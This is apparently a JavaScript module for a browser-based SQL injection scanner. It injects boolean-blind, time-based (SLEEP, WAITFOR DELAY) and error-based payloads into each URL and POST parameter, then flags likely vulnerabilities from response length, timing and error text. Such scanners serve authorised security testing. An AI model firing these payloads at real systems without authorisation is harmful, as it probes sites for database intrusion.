/**
 * SQL injection scanner - runs entirely in the browser.
 * All HTTP requests originate from the user's machine.
 */

const PAYLOADS = {
  boolean: [
    { true: ' AND 1=1-- ', false: ' AND 1=2-- ', comment: 'Boolean blind (AND)' },
    { true: "' AND '1'='1", false: "' AND '1'='2", comment: "Boolean blind (quote)" },
    { true: '" AND "1"="1', false: '" AND "1"="2', comment: 'Boolean blind (double quote)' },
  ],
  timeBased: [
    { payload: " AND SLEEP(3)-- ", dbms: 'MySQL' },
    { payload: "'; WAITFOR DELAY '0:0:3'-- ", dbms: 'MSSQL' },
    { payload: " AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- ", dbms: 'MySQL' },
    { payload: "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- ", dbms: 'MySQL' },
  ],
  errorBased: [
    { payload: "'", comment: 'Quote to trigger error' },
    { payload: "\"", comment: 'Double quote' },
    { payload: "1' OR '1'='1", comment: 'OR injection' },
  ],
};

function parseUrl(url, postData = null) {
  try {
    const u = new URL(url);
    const queryParams = [];
    u.searchParams.forEach((v, k) => queryParams.push({ name: k, value: v }));

    let bodyParams = [];
    if (postData && typeof postData === 'string' && postData.trim()) {
      const bp = new URLSearchParams(postData.trim());
      bp.forEach((v, k) => bodyParams.push({ name: k, value: v }));
    }

    const allParams = [...queryParams, ...bodyParams];
    const method = bodyParams.length > 0 ? 'POST' : 'GET';

    return {
      origin: u.origin,
      pathname: u.pathname,
      search: u.search,
      params: allParams,
      queryParams,
      bodyParams,
      method,
      postData: bodyParams.length ? postData.trim() : null,
    };
  } catch {
    return null;
  }
}

async function fetchWithTiming(url, options = {}) {
  const start = performance.now();
  const fetchOpts = { mode: 'cors', credentials: 'omit', ...options };
  const res = await fetch(url, fetchOpts);
  const text = await res.text();
  const elapsed = performance.now() - start;
  return { status: res.status, text, elapsed, ok: res.ok };
}

async function doRequest(req) {
  return fetchWithTiming(req.url, req.method === 'POST' ? {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: req.body,
  } : {});
}

function getParamOriginalValue(urlInfo, paramName) {
  const p = urlInfo.params.find(x => x.name === paramName);
  return p ? p.value : '';
}

function buildRequest(urlInfo, paramName, injectedValue) {
  const u = new URL(urlInfo.origin + urlInfo.pathname + (urlInfo.search || ''));
  const inQuery = urlInfo.queryParams.some(p => p.name === paramName);

  if (inQuery) {
    u.searchParams.set(paramName, injectedValue);
    const body = urlInfo.postData ? buildBody(urlInfo.bodyParams, paramName, injectedValue) : null;
    return { url: u.toString(), method: urlInfo.method, body };
  }
  const body = buildBody(urlInfo.bodyParams, paramName, injectedValue);
  return { url: u.toString(), method: 'POST', body };
}

function buildBody(bodyParams, injectParam, injectValue) {
  const p = new URLSearchParams();
  for (const { name, value } of bodyParams) {
    p.set(name, name === injectParam ? injectValue : value);
  }
  return p.toString();
}

async function testParameter(urlInfo, paramName, technique, onProgress) {
  const results = [];
  const getReq = (injected) => buildRequest(urlInfo, paramName, injected);

  const orig = getParamOriginalValue(urlInfo, paramName);

  if (technique === 'boolean' || technique === 'all') {
    for (const p of PAYLOADS.boolean) {
      onProgress?.({ phase: 'boolean', payload: p.true });
      const reqTrue = getReq(orig + p.true);
      const reqFalse = getReq(orig + p.false);

      const [rTrue, rFalse] = await Promise.all([
        doRequest(reqTrue),
        doRequest(reqFalse),
      ]);

      const diff = Math.abs(rTrue.text.length - rFalse.text.length);
      const suspect = diff > 50 || (rTrue.status !== rFalse.status);
      results.push({
        technique: 'boolean',
        comment: p.comment,
        suspect,
        lenTrue: rTrue.text.length,
        lenFalse: rFalse.text.length,
        statusTrue: rTrue.status,
        statusFalse: rFalse.status,
      });
      if (suspect) break;
    }
  }

  if (technique === 'time' || technique === 'all') {
    for (const p of PAYLOADS.timeBased) {
      onProgress?.({ phase: 'time', dbms: p.dbms });
      const req = getReq(orig + p.payload);
      const r = await doRequest(req);
      const suspect = r.elapsed > 2800;
      results.push({
        technique: 'time',
        dbms: p.dbms,
        suspect,
        elapsed: Math.round(r.elapsed),
      });
      if (suspect) break;
    }
  }

  if (technique === 'error' || technique === 'all') {
    for (const p of PAYLOADS.errorBased) {
      onProgress?.({ phase: 'error', payload: p.payload.substring(0, 20) });
      const req = getReq(p.payload);
      const r = await doRequest(req);
      const errorPatterns = /SQL|mysql|syntax|ORA-|PostgreSQL|SQLite|error|exception|warning/i;
      const suspect = errorPatterns.test(r.text) || r.status >= 500;
      results.push({
        technique: 'error',
        comment: p.comment,
        suspect,
        status: r.status,
        snippet: r.text.substring(0, 200),
      });
      if (suspect) break;
    }
  }

  return results;
}

export async function runScan(url, options = {}, onProgress) {
  const urlInfo = parseUrl(url, options.postData);
  if (!urlInfo) throw new Error('Invalid URL');
  if (urlInfo.params.length === 0) throw new Error('No parameters in URL or POST data. Add ?id=1 to URL or provide POST data.');

  const technique = options.technique || 'all';
  const findings = [];

  for (const param of urlInfo.params) {
    onProgress?.({ param: param.name });
    const results = await testParameter(urlInfo, param.name, technique, onProgress);
    const suspect = results.some(r => r.suspect);
    findings.push({ param: param.name, results, suspect });
  }

  return { url, findings, urlInfo };
}
